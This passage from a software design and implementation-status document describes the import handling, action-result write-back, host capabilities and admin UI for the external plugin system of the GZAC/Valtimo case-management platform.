  `externalPluginConfigurationId`). One user-facing `Map<sourceUUID, targetUUID?>` covers both
  plugin systems — source UUIDs are unambiguous across them.
- **Preview.** `ExternalPluginImportPreviewContributor` (`backend/external-plugin/preview/`) scans
  `*.process-link.json` for `external_plugin` / `external_plugin_task_form` links,
  `*.case-tab.json` for `EXTERNAL_PLUGIN` tabs, **and** `*.case-widget-tab.json` for `external-plugin`
  widgets (`pluginActionDefinitionKey: "case-widget"`), emitting entries with `source: external`,
  pluginId, version, and an existence check. `PluginConfigurationPreviewDto` carries the
  `source: embedded|external` discriminator (default `embedded`).
- **Dangling handling.** An unmapped external link imports with a null configuration id; both
  external mappers' `afterImport` publish a `CaseConfigurationIssueDetectedEvent`
  (`external-plugin-process-link`). `ExternalPluginConfigurationMappingResolver` registers as an
  additional `PluginConfigurationMappingResolver` bean behind the existing
  `dangling-plugin-configurations` / `plugin-configuration-mappings` endpoints — no new endpoints.
- **`EXTERNAL_PLUGIN` case-tab import.** `CaseTabImporter` remaps the configuration UUID embedded
  in the tab's `contentKey` (`"<configId>[:<bundleKey>]"`) through the same mappings and creates
  the `case_external_plugin_tab` side row for imported tabs (the REST-driven create path derives
  the side row from `CaseTabCreatedEvent`, which a repository-level import does not fire — the
  importer therefore materialises it itself).
- **`external-plugin` case-widget import.** `CaseWidgetTabImporter` remaps each widget's
  `properties.configurationId` through the same mappings (keeping the original, now-dangling id when
  a mapping is left unset — like the tab, so the repair panel can offer a chooser from that source
  id), and its `afterImport` triggers `recheckIssuesForCaseDefinition` on the mapping resolvers so a
  dangling widget raises the `external-plugin-case-widget` issue at import time (widgets aren't
  process links). The exporter stamps each widget's `pluginDefinitionKey`/version so the export is
  self-describing. `CaseExternalPluginWidgetService` (in `case`) backs the resolver's dangling
  detection + remap and the delete guard's usage lookup, mirroring `CaseExternalPluginTabService`.
- **Wizard & repair UI** (`@valtimo/case-management`). The upload wizard's PLUGINS step and the
  missing-plugin-configurations repair component render external rows with options from
  `ExternalPluginService.getConfigurations()`, exact-version matches by default and
  version-mismatched candidates behind an explicit warning, labelled `Name (X.Y.Z)`.

## 21. Action result write-back ✅

A plugin action's result can be written declaratively to the case/building-block document or to
process variables through value-resolver expressions — for embedded **and** external plugin
actions, with no hand-coded `resultProcessVariable` action property needed.

- **Model.** `process_link.action_result_mappings` (json), mapped by both `PluginProcessLink` and
  `ExternalPluginProcessLink`; rows are `PluginActionResultMapping(source, target)` where `source`
  is an RFC 6901 JSON pointer into the action result (empty pointer = whole result) and `target`
  is a writable value-resolver key (`doc:`, `pv:`, `case:` — non-writable prefixes are rejected at
  save time by `PluginActionResultMappingValidator` in both mappers).
- **Dispatch (`PluginActionResultHandler`, `backend/plugin`).** Extracts each source pointer,
  splits `pv:` targets from document targets, and applies them via
  `ValueResolverService.handleValues` — the same pattern the building-block listeners use. Because
  `doc:` targets the execution's business-key document, a result written inside a building-block
  process lands on the **BB instance document** and BB output mappings carry it to the case as
  usual. Pointer misses and a null result with configured mappings log a warning; they never fail
  the process.
- **Embedded source.** `PluginService.invoke` (both overloads) captures the `@PluginAction`
  method's return value, serialises it, and delegates to the handler, so
  every listener (service task, user task, call activity, send/receive/intermediate events) is
  covered without listener changes.
- **External source.** The action output's optional `result` field (§7):
  `ExternalPluginServiceTaskStartListener` keeps applying `variables` as plain process variables
  and additionally feeds `body.result` through the handler. SDK `ActionOutput` declares `result`;
  the host passes it through verbatim; the `case-summary` sample action returns one.
- **Admin UX** (`@valtimo/process-link`). `PluginActionResultMappingsComponent` — an "Output
  mapping" section in the action-configuration step for both embedded and external actions:
  source/target rows with a free-text JSON-pointer input and a `ValuePathSelectorComponent` target
  (`doc:`/`case:` browsing with case/BB context; free-text `pv:` fallback for independent
  processes).

---

## Implementation status (§18)

Tracks what is done and what remains. No backward compatibility — still in dev.

### ✅ Done — plugin-host side (SDK + host app + sample plugin)

All compile clean (`tsc --noEmit` passes for SDK, host app, and sample plugin — the sample
plugin has one pre-existing TS error in the submit handler unrelated to capabilities).

**SDK (`plugin-sdk/`)**
- `models/types.ts` — `HOST_CAPABILITIES` const, `HostCapability` type, `capabilities` on
  `PluginManifest.permissions`, `HttpRequestResponse`, `KvGetResult` types.
- `models/index.ts` — re-exports new types + `HOST_CAPABILITIES` value.
- `manifest-validation.ts` — rejects unknown capabilities; flags `endpoints` without `gzac_api`.
- `host-functions.ts` — `log` accepts optional `data` arg, calls real Extism host function,
  added `debug` level.
- `kv.ts` (new) — `kv.get()`, `.set()`, `.delete()`, `.list()` via Extism host function.
- `http-request.ts` (new) — `httpRequest.get()`, `.post()`, `.put()`, `.delete()`.
- `index.ts` — exports `httpRequest`, `kv`, new types.

**Host app (`app/`)**
- `db/index.ts` — migration 3 (`granted_capabilities` column) + migration 4 (`plugin_kv` +
  `plugin_logs` tables with indexes).
- `db/kv-repository.ts` (new) — `get`, `set`, `delete`, `list`, `deleteAll`.
- `db/log-repository.ts` (new) — `insert`, `query` (paginated, filterable by level/source),
  `deleteOlderThan`, `deleteByConfiguration`.
- `db/config-repository.ts` — stores/reads `granted_capabilities` JSONB column.
- `models/plugin-configuration.ts` — `grantedCapabilities?: string[]` field.
- `host-functions/gzac-api.ts` — capability gate (`gzac_api`), `grantedCapabilities` on
  `GzacApiCallContext`.
- `host-functions/kv.ts` (new) — `kv` host function with capability gate, delegates to
  `KvRepository`.
- `host-functions/log.ts` (new) — `log` host function with capability gate, writes to pino +
  persists to `plugin_logs` (async, non-blocking).
- `host-functions/http-request.ts` (new) — `http_request` host function with capability gate,
  deny-by-default egress allowlist (`security/egress-allowlist.ts`), HTTPS-only default
  (`HOST_ALLOW_HTTP=true` for dev), SSRF address envelope with the `HOST_ALLOWED_INTERNAL_CIDRS`
  operator carve-out (`security/url-guard.ts`), blocks calls to `gzacBaseUrl`, timeout cap 60s,
  auto-logs to `plugin_logs`. Every check re-runs on each redirect hop.
- `plugin-manager.ts` — registers all 4 host functions on `createPlugin`, new constructor
  params (`configRepository`, `kvRepository`, `logRepository`, `allowHttp`), private
  `resolveCapabilities()` helper, threads `grantedCapabilities` through every `hostContext`.
- `routes/plugin-logs.ts` (new) — `GET /api/host/configurations/:configId/logs` HMAC-signed,
  paginated, filterable by `level`/`source`.
- `index.ts` — wires `KvRepository`, `LogRepository`, `pluginLogRoutes`, log retention job
  (`LOG_RETENTION_DAYS` env, default 30, runs on startup + every 6h), clears interval on
  shutdown.

**Sample plugin (`case-summary/`)**
- `manifest.json` — `permissions.capabilities: ["gzac_api", "http_request", "kv", "log"]`,
  new `en`/`nl` translations for external-data and view-count UI sections.
- `src/plugin.ts` — KV view counter in `/summary`, new `/external-data` handler
  (JSONPlaceholder + KV + structured log), new `/kv-stats` handler, all existing `log.info()`
  calls updated to structured form with `data` parameter.

### ✅ Done — GZAC backend (Kotlin)

All compile clean (`compileKotlin` + `compileTestKotlin` + `test` pass).

1. **Domain** — `ExternalPluginGrantedCapability` entity.
2. **Repository** — `ExternalPluginGrantedCapabilityRepository`.
3. **Liquibase** — `20260716-external-plugin-granted-capability.xml` in `13-32-0/`.
4. **Service** — `ExternalPluginConfigurationService.create()`: add `grantedCapabilities`
   parameter, `validateGrantedCapabilitiesCoverManifest()` gate, persist to new table.
   `update()` does **not** accept `grantedCapabilities` (immutable after activation).
4. **Service** — `create()` accepts + validates + persists `grantedCapabilities`. `pushToHost()`
   includes them. `delete()` cleans them up. `getGrantedCapabilities()` query.
5. **Config push** — `pushToHost()` reads `grantedCapabilities` and passes to client.
   `ExternalPluginHostClient.pushConfiguration()` includes `grantedCapabilities` in body.
6. **REST DTO** — `ConfigurationCreateRequest` gains `grantedCapabilities`, new
   `GrantedCapabilityResponse`, `ConfigurationDetailResponse` includes capabilities.
7. **Management resource** — `createConfiguration` passes capabilities through,
   `getConfiguration` returns them.
8. **Host service** — `delete()` cleans up `grantedCapabilityRepository`.
9. **Autoconfiguration** — wired `grantedCapabilityRepository` into both services.
10. **Tests** — all 3 test files updated for new constructor param; all pass.

### ✅ Done — GZAC frontend (Angular)

All build clean (`ng build @valtimo/plugin` + `ng build @valtimo/plugin-management`).

1. **Permission UX** — `plugin-external-permissions` component: capabilities section added
   (structured list with purple `cds-tag` per capability + localised descriptions). Renders
   before endpoints. Checkbox condition includes capabilities. i18n added (en + nl) under
   `pluginManagement.permissions.capability.*`.
2. **Add modal** — `capabilities$` observable, `onCapabilitiesResolved`, `onGrantedCapabilitiesChange`,
   `grantedCapabilities` in save payload.
3. **Configure component** — `capabilitiesResolved` output, `setGrantedCapabilities`, `grantedCapabilities`
   in both save emit paths.
4. **Edit modal** — `_$capabilities` signal, wired through to readonly permissions component,
   `_$hasPermissionsStep` includes capabilities.
5. **Model** — `ExternalPluginPermissions.capabilities?: Array<string>`,
   `ExternalPluginConfigurationCreateRequest.grantedCapabilities`.

### ✅ Done — all remaining items

All builds pass: backend `compileKotlin` + `test`, host `tsc`, SDK `tsc`, frontend `ng build`.

6. **Tag colors** — permissions screen: capabilities = purple, HTTP methods = color-coded by
   verb (GET=blue, POST=green, PUT=teal, DELETE=red), endpoint patterns = cool-gray,
   events = teal.
7. **GZAC log proxy endpoint** — `GET .../configuration/{configId}/logs` proxies to host via
   HMAC. `ExternalPluginHostClient.getConfigurationLogs()`. Autoconfiguration wired.
8. **Admin log modal** — `PluginLogModalComponent` (standalone): `cds-modal size="lg"` with
   level/source filter dropdowns + `valtimo-carbon-list` (paginated) + row-click detail aside.
   Overflow menu "Logs" item on external configs. i18n (en + nl).
9. **Frontend service** — `ExternalPluginService.getConfigurationLogs()`.
10. **Frontend model** — `PluginLogEntry`, `PluginLogPage`.
11. **Sample plugin frontend** — case-tab: "External API data" card (JSONPlaceholder todo via
   `http_request`), per-document KV view counter badge, tab view count from `/summary`.
